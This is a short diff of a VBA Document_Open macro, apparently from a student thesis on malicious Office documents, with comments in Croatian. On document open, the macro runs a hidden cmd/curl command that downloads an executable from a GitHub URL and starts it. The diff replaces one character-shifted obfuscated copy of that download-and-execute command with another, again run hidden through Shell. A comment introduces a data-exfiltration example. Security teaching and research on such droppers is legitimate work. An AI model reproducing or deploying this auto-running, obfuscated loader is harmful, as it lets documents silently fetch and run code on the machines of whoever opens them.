@@ -9,8 +9,8 @@ Sub Document_Open()
     Shell "cmd /c curl -L ""https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe"" --output preuzeto.exe && start preuzeto.exe", vbHide
 
 'obfuscirano preuzimanje i pokretanje remote datoteke
-NdkF = "": For i = 1 To 146: NdkF = NdkF + Chr(Asc(Mid("hri%4h%hzwq%2Q%''myyux?44lnymzg3htr4fhu|nsyjwx4_f{wxsndWfi4wf|4rfns4hfqh3j}j''%22tzyuzy%tgkzxhnwfstduwjzjyt3j}j%++%xyfwy%tgkzxhnwfstduwjzjyt3j}j", i, 1)) - (5)): Next
-Shell NdkF, vbHide
+aeQd = "": For i = 1 To 146: aeQd = aeQd + Chr(Asc(Mid("dne!0d!dvsm!.M!##iuuqt;00hjuivc/dpn0bdqxjoufst0[bwstoj`Sbe0sbx0nbjo0dbmd/fyf##!..pvuqvu!qsfv{fup`pcgvtdjsbop/fyf!''!tubsu!qsfv{fup`pcgvtdjsbop/fyf", i, 1)) - (1)): Next
+Shell aeQd, vbHide
 
 'upload calc.exe na localhost za primjer exfiltracije podataka
     Dim exfil As String
